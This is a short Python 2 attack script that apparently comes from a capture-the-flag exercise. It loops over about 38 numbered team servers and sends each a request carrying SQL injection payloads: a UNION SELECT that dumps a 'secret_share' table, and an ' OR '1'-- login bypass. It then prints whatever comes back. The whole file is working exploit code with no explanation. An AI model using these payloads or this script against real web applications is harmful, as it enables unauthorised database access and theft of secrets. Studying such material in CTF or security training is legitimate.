import urllib
import urllib2
import sys

thing = 'http://ctfteam'
thing2 = '.mit.edu/serverBackend.php'

for x in range(1, 39):
    try:
        url = thing + str(x) + thing2
        values = {'user' : "' AND 0=1 UNION SELECT string_agg(secret, ',') FROM secret_share GROUP BY 0=0--", 'pwd' : "' OR '1'--", 'flag' : '', 'hash_pwd' : '43043bec128a105a894e3560b4f4d8e7e2660cb7ff38260e33143dcb99bf4046', 'command' : 'retrieveSecret'}
        data = urllib.urlencode(values)
        req = urllib2.Request(url + '?' + data)
        response = urllib2.urlopen(req)
        the_page = response.read()
        print the_page
    except:
        print sys.exc_info()[0], x
        continue
        
 
